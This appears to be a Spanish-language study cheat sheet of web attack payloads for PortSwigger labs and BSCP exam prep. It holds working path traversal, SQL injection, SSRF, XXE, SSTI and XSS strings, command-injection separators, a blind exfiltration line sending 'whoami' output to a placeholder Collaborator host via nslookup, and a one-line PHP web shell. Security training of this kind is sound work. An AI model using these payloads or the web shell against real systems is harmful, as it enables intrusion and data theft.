# Payloads de alto valor

> Colección **curada**, no enciclopédica. La meta es recordar payloads pequeños que sirven para confirmar hipótesis en Web Security Academy, Mystery Labs y preparación autorizada del BSCP.

Usar placeholders:

```text
LAB
COLLABORATOR
USERNAME
PARAM
```

No pegar dominios/sesiones reales en estas notas.

---

# Path Traversal

## Caso simple

```text
../../../etc/passwd
```

## Nested traversal

```text
....//....//....//etc/passwd
```

## URL encoded

```text
..%2f..%2f..%2fetc%2fpasswd
```

## Double encoded

```text
..%252f..%252f..%252fetc%252fpasswd
```

## Absolute path

```text
/etc/passwd
```

## Prefijo obligatorio

```text
/var/www/images/../../../etc/passwd
```

## Extensión obligatoria / null byte cuando el runtime lo permita

```text
../../../etc/passwd%00.jpg
```

Objetivo final típico de práctica BSCP:

```text
/home/carlos/secret
```

---

# Access Control

## IDs

```text
id=wiener → id=carlos
user=wiener → user=administrator
```

## Roles / flags

```text
Admin=false → Admin=true
role=user → role=admin
isAdmin=0 → isAdmin=1
```

## Rutas

```text
/admin
/administrator-panel
```

Recordar revisar:

```text
robots.txt
JavaScript
redirect body
cookies
JSON fields
HTTP method
Referer
X-Original-URL
X-Rewrite-URL
```

---

# Authentication

## Headers frecuentes al probar protección basada en IP

```http
X-Forwarded-For: 127.0.0.1
```

## Cookies predecibles

Patrones a reconocer:

```text
username:hash
Base64(username:hash)
username:md5(password)
```

No asumir el esquema: decodificar primero.

## 2FA

Buscar parámetros como:

```text
verify=
username=
mfa-code=
```

Comprobar si el usuario objetivo se selecciona mediante un parámetro controlable.

---

# SQL Injection

## Prueba booleana básica

```sql
' AND 1=1-- -
' AND 1=2-- -
```

## Número de columnas

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
```

Alternativa:

```sql
' UNION SELECT NULL,NULL-- -
```

## Columna que acepta texto

```sql
' UNION SELECT 'test',NULL-- -
' UNION SELECT NULL,'test'-- -
```

## PostgreSQL time-based

```sql
';SELECT pg_sleep(5)-- -
```

Condicional:

```sql
SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END
```

## DB-specific delays

```text
PostgreSQL → pg_sleep(5)
MySQL      → SLEEP(5)
MSSQL      → WAITFOR DELAY '0:0:5'
Oracle     → DBMS_PIPE.RECEIVE_MESSAGE('a',5)
```

## Enumeración portable

```sql
information_schema.tables
information_schema.columns
```

Oracle:

```sql
all_tables
all_tab_columns
```

## Concatenación

```text
Oracle/PostgreSQL → 'a'||'b'
MySQL             → CONCAT('a','b')
MSSQL             → 'a'+'b'
```

---

# SSRF

## Loopback

```text
http://127.0.0.1/
http://localhost/
http://127.1/
```

## Admin interno

```text
http://127.0.0.1/admin
http://localhost/admin
```

## Red interna típica de labs

```text
192.168.0.0/24
```

Usar Intruder solo después de confirmar que el backend realmente hace requests.

## OAST

```text
https://COLLABORATOR/
```

Si hay callback, confirmar SSRF/blind SSRF antes de intentar bypasses más complejos.

---

# OS Command Injection

## Separadores rápidos

```text
; whoami
| whoami
|| whoami
& whoami
&& whoami
```

## Blind por tiempo

```text
; sleep 5
```

## Blind OAST

```text
; nslookup $(whoami).COLLABORATOR
```

## Leer el objetivo del entorno de práctica

```text
cat /home/carlos/secret
```

Si la salida no se refleja, combinar con un canal observable autorizado como Collaborator o escribir a una ruta servida por la app cuando el lab lo enseñe.

---

# File Upload

## PHP mínimo para lectura de archivo en laboratorio

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

## Web shell mínima

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

## Magic bytes simples usados en labs

```text
GIF8
```

## `.htaccess` cuando Apache permite override

```apache
AddType application/x-httpd-php .foo
```

Luego probar un archivo con extensión `.foo` únicamente si el contexto/lab indica Apache y permite `.htaccess`.

---

# XXE / XInclude

## XXE file read conceptual

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

## XInclude

Cuando controlas un valor dentro de XML pero no el DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Para el objetivo final de práctica:

```text
file:///home/carlos/secret
```

---

# SSTI

Payloads de identificación deben depender del motor/contexto. Empezar por expresiones aritméticas inocuas y observar renderizado.

Ejemplos frecuentes en labs:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
```

No saltar directamente a RCE sin identificar antes el template engine.

---

# XSS / DOM

## HTML context básico

```html
<script>alert(1)</script>
```

## Event handler

```html
<img src=x onerror=alert(1)>
```

## AngularJS clásico de labs

```text
{{$on.constructor('alert(1)')()}}
```

## JavaScript template literal

```text
${alert(1)}
```

## DOM `document.write` dentro de `select`

```text
"></select><script>alert(1)</script>
```

Para la fase de preparación final se añadirá una colección separada de payloads para víctima/Collaborator una vez estudiado XSS oficialmente.

---

# CSRF

Recordatorios de pruebas antes de construir una POC compleja:

```text
¿token obligatorio?
¿token vinculado a sesión?
¿acepta token de otro usuario?
¿puedo quitar token?
¿cambia si GET/POST?
¿Referer obligatorio?
```

Burp puede generar una POC desde Repeater/Engagement tools cuando corresponda.

---

# Headers de prueba recurrentes

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: example.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

No probar headers aleatoriamente: deben responder a una hipótesis sobre proxy, routing, Host o control basado en IP.

---

# Fuzzer pequeño de caracteres

Útil para descubrir qué se filtra/escapa:

```text
<>'"\${}()[];|&
```

Adaptarlo al contexto (HTML, JS, SQL, shell, template).

---

# Regla de mantenimiento

Cada payload que se agregue deberá indicar:

```text
1. Vulnerabilidad
2. Contexto
3. Qué señal confirma
4. Qué parser/motor espera
5. Lab o fuente de referencia
```

Si no podemos explicar esos cinco puntos, no merece estar en el cheat sheet principal.
